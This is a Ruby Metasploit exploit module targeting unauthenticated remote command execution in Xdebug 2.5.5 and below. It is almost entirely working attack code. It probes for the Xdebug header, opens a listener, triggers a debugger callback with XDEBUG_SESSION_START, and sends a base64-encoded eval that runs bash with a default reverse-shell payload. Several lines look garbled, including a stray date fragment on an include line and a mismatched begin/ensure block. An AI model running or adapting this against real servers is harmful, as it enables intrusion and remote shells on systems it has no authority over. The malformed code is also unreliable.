# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Remote::HttpClient 2017-09-17 ',
  include Rex::Proto::Http
  def initialize(info = {})
	super(update_info(info,
      'Name' => 'xdebug Unauthenticated OS Command Execution',
      'Description' => %q{
       'Module exploits a vulnerability in the eval command present in Xdebug versions 2.5.5 and below. This allows the attacker to execute arbitrary php code as the context of the web user.' 
      },
       'DisclosureDate' => ' 2017-09-17 ',	 
      'Author' => [
	'Ricter Zheng', #Discovery https://twitter.com/RicterZ     
        'Shaksham Jaiswal', #MinatoTW
	'Mumbai' #Austin Hudson
      ],
      'References' => [
        ['URL', 'https://redshark1802.com/blog/2015/11/13/xpwn-exploiting-xdebug-enabled-servers/'],
	['URL', 'https://paper.seebug.org/397/']
      ],
      'License' => MSF_LICENSE,
      'Platform' => 'unix',
      'Arch' => [ARCH_CMD],
      'DefaultTarget' => 0,
      'Stance' => Msf::Exploit::Stance::Aggressive,
      'DefaultOptions' => {
        'PAYLOAD' => 'cmd/unix/reverse_bash'
      },
      'Payload' => {
        'DisableNops' => true,
      },
      'Targets' => [[ 'Automatic', {} ]],
    ))

    register_options(
      [
        OptString.new('PATH', [ true, "Path to target webapp", "/index.php"]),
        OptAddress.new('SRVHOST', [ true, "Callback host for accepting connections", "0.0.0.0"]),
	OptInt.new('SRVPORT', [true, "Port to listen for the debugger", 9000]),
	OptAddress.new('RHOST', [true, "Target address"]),
	OptInt.new('RPORT', [true, "Target port", 80])  
      ]
    )
  end

  def check
    begin
      res = send_request_cgi({
	'uri' => datastore["PATH"],
        'method' => 'GET'
      })

      vprint_line "Request send\n#{res.headers}"
      if res && res.headers["Xdebug"]
	print_good("Looks like remote server has xdebug enabled\n")
        return Exploit::CheckCode::Detected
      else
        return Exploit::CheckCode::Safe
      end
      rescue Rex::ConnectionError
      return Exploit::CheckCode::Unknown
    end
  end

  def exploit
   begin
    check	   
    srvhost = datastore["SRVHOST"]
    srvport = datastore["SRVPORT"]
    rhost = datastore["RHOST"]
    rport = datastore["RPORT"]
    lhost = datastore["LHOST"]
    uri = datastore["PATH"]
    cmd= "eval -i 1 -- "+ Rex::Text.encode_base64("system(\" bash -c \'#{payload.encoded}\'\")")+"\x00"
    print_status("Sending payload...... ")
    vprint_line("Payload sent-#{cmd}")
    webserv=Thread.new do
    server=Rex::Socket::TcpServer.create(
		    'LocalPort' => srvport,
		    'LocalHost' => srvhost,
		    'Context'   =>
		           {
			       'Msf'        => framework,
			       'MsfExploit' => self
			   }
	    )
    	client=server.accept 
	print_status("Waiting for client response.....")
	data=client.recv(1024)
	print_status("Received data.....")
    	vprint_line(data)
	client.write(cmd)
    	client.close
	server.close
	webserv.exit
    ensure
        webserv.exit	    
    end
    res=send_request_cgi({
	    'uri' => datastore["PATH"],
	    'method' => 'GET',
	    'headers' => {
		    'X-Forwarded-For' => "#{lhost}" 
	    },
	    'vars_get' => {
		    'XDEBUG_SESSION_START' => rand_text_alphanumeric(10)
	    }
    })
end
  end
end  

